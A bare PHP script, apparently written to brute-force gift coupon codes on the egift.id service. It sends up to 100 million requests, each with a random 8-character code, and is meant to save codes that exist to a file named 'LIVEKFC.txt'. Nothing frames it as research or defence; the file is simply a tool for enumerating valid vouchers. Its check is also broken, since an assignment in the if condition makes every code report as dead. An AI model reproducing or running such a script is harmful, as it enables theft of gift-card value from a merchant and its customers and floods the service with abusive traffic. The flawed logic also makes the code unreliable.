<?php
    function getCurl($data) {
		
            // echo "<pre>";
            // print_r($data);
            // echo "</pre>";
            $curl = curl_init();
    
            curl_setopt_array($curl, array(
                CURLOPT_URL => $data['url'],
                CURLOPT_RETURNTRANSFER => true,
                // CURLOPT_SSL_VERIFYHOST => 0,
                // CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_ENCODING => "",
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 5,
                CURLOPT_HTTPHEADER => $data['header'],
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => $data['method'],
                CURLOPT_POSTFIELDS => $data['parser'],
            ));
    
            
            $response = curl_exec($curl);
            $err = curl_error($curl);
        
            curl_close($curl);
    
            if ($err) return $err;
            else return $response;
        }
        
        function random($length = 8) {
            $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $charactersLength = strlen($characters);
            $randomString = '';
            for ($i = 0; $i < $length; $i++) {
                $randomString .= $characters[rand(0, $charactersLength - 1)];
            }
            return $randomString;
        }


        function getCode() {
            $main_url = "http://egift.id/";
            // return json_encode([]);
            
           
            // $data

            for($i=0;$i<100000000;$i++){
                $rand = random() ;


            $curl['code'] = [
                'url' =>  $main_url.$rand,
                'parser' => null,
                'header' => [
                    // "Authorization:  Basic ".$this->token,
                    "Content-Type:  application/json",
                ],
                'method' => "GET",
                
            ];
            $results['data']['code'] = $curl['code'];
            $results['result']['code'] = json_decode(getCurl($curl['code']), true);
            
            if($results['result']['code']['rst_msg']="Coupon does not exist."){
                echo "[ DIE ] - ".$main_url." ".$rand." ".$results['result']['code']['rst_msg'].PHP_EOL;
            }
            else{
                file_put_contents("LIVEKFC.txt", "\n{".$main_url." ".$rand."} | Status: {$results['result']['code']['rst_msg']}", FILE_APPEND);
                echo "[ d ] - ".$main_url." ".$rand." ".$results['result']['code']['rst_msg'].PHP_EOL;
            }

            $callback = json_encode($results);
            // return $results['result']['code']['rst_msg'];
        }
    }
        getCode();
?>
